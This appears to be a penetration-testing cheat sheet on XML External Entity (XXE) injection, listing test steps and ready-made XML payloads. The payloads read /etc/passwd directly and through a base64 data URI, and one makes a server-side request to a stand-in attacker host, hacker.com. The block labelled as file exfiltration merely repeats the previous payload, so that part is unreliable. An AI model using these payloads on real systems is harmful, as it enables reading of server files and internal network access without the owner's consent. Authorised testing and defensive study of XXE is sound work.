# XML External Entity (XXE)

* Check&#x20;
  * XML POST data
  * JSON POST data&#x20;
    * Burpsuite -> **Content Type Converter**&#x20;
* New Entity Test
  * Add `&toreplace` in any input XML tag
  * If 200, XXE possible

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<roottag>
    <productid>&toreplace</productid>
    <storeid>1</storeid>
</roottag>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace SYSTEM "/etc/passwd"> ]>
<roottag>
    <productid>&toreplace</productid>
    <storeid>1</storeid>
</roottag>
```

XXE to SSRF

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY> <!ENTITY % xxe SYSTEM "http://hacker.com/test"> ]>
<foo>&xxe;</foo>
```

XXE Base64 Encoded

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;]>
<foo/>
```

Exfiltrate files from server

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;]>
<foo/>
```
